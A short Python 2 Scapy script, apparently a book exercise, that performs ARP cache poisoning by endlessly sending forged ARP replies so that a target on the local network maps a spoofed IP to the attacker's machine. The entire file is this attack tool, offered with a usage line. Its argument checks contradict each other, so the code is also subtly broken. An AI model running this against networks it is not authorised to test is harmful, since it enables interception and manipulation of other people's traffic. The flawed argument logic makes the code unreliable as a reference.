#!/usr/bin/env python

import sys, time
from scapy.all import *

target_ip = sys.argv[1]
fake_ip = sys.argv[2]

def banner():
   print "#####################################"
   print "#   ARP Cache Poisoning; pg 36      #"
   print "#####################################"
   print ""
usage = "./UNHarpatk <target> <spoof ip>"

def arpspoof(target_ip, fake_ip):
	if len(sys.argv) < 3:
	    print sys.argv[0] + ": <target> <spoof-ip>"
	    sys.exit(1)
	iface = "wls1"
	target_ip = sys.argv[1]
	fake_ip = sys.argv[2]

	ethernet = Ether()
	arp = ARP (pdst=target_ip,
	           psrc=fake_ip,
	           op="is-at")
	packet = ethernet /arp
	while True:
	    sendp(packet, iface = iface)
	    time.sleep(10)

def main():
	if len(sys.argv) == 2:
		banner()
		arpspoof(target_ip, fake_ip)
	else:
		print usage

if __name__ == "__main__":
    main()
